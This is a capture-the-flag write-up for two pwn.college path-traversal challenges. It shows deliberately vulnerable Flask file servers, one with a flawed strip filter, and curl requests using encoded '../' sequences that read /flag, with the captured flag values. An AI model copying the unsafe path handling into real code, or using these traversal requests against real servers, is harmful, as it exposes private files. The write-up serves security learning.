---
custom_edit_url: null
sidebar_position: 1
---

## Path Traversal 1

### Source code
```py title="/challenge/server" showLineNumbers
#!/opt/pwn.college/python

import flask
import os

app = flask.Flask(__name__)


@app.route("/data", methods=["GET"])
@app.route("/data/<path:path>", methods=["GET"])
def challenge(path="index.html"):
    requested_path = app.root_path + "/files/" + path
    print(f"DEBUG: {requested_path=}")
    try:
        return open(requested_path).read()
    except PermissionError:
        flask.abort(403, requested_path)
    except FileNotFoundError:
        flask.abort(404, f"No {requested_path} from directory {os.getcwd()}")
    except Exception as e:
        flask.abort(500, requested_path + ":" + str(e))


app.secret_key = os.urandom(8)
app.config["SERVER_NAME"] = f"challenge.localhost:80"
app.run("challenge.localhost", 80)
```

The challenge looks for the `/data` path in the request and then uses the following `<path:path>` in order to craft the full requested path.

```
## Request:
curl "challenge.localhost:80/data/../../flag"

## Full path
/challenge + /files/ + flag  -->  /challenge/files/../../flag  -->  /flag
```

Let's perform path traversal to solve this challenge.

```
hacker@web-security~path-traversal-1:/$ curl "challenge.localhost:80/data/..%2F..%2Fflag"
pwn.college{A0_4-6SgR7VQApzuImhC7CrZa4J.ddDOzMDL4ITM0EzW}
```

&nbsp;

## Path Traversal 2

```py title="/challenge/server" showlineNumbers
#!/opt/pwn.college/python

import flask
import os

app = flask.Flask(__name__)


@app.route("/dump", methods=["GET"])
@app.route("/dump/<path:path>", methods=["GET"])
def challenge(path="index.html"):
    requested_path = app.root_path + "/files/" + path.strip("/.")
    print(f"DEBUG: {requested_path=}")
    try:
        return open(requested_path).read()
    except PermissionError:
        flask.abort(403, requested_path)
    except FileNotFoundError:
        flask.abort(404, f"No {requested_path} from directory {os.getcwd()}")
    except Exception as e:
        flask.abort(500, requested_path + ":" + str(e))


app.secret_key = os.urandom(8)
app.config["SERVER_NAME"] = f"challenge.localhost:80"
app.run("challenge.localhost", 80)
```

This cahllenge strips the `\.` charaacters from the beginning and the end of the `<path:path>` string.

```
## Request:
curl "challenge.localhost:80/dump/../../flag"

## Strip
../../flag  -->  flag

## Full path
/challenge/files/flag
```

Fortunately, there is a `fortunes` directory we can use to our advantage.

```
hacker@web-security~path-traversal-2:/$ ls /challenge/files/
fortunes  index.html
```

```
## Request:
curl "challenge.localhost:80/dump/fortunes/../../../flag"

## Strip
fortunes/../../../flag  -->  fortunes/../../../flag  ## Since there are no leading or trailing `./` characters.

## Full path
/challenge + /files/ + fortunes/../../../flag  -->  /challenge/files/fortunes/../../../flag  -->  /flag
```

```
hacker@web-security~path-traversal-2:/$ curl "challenge.localhost:80/dump/fortunes/..%2F..%2F..%2Fflag"
pwn.college{gTCJICEJPu2FAs5FxbMoQ5lh9sz.dJjN1YDL4ITM0EzW}
```
